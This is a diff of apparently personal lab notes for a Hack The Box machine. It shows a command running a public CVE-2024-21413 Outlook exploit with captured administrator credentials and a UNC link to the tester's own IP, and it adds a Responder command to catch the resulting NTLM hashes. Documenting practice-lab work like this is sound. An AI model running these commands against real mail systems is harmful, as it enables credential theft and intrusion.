@@ -3,3 +3,5 @@ https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution
 
 ┌──(milo㉿Kali2023)-[~/Downloads/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-main]
 └─$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.179/test" --subject milo_test
+
+sudo responder -I tun0
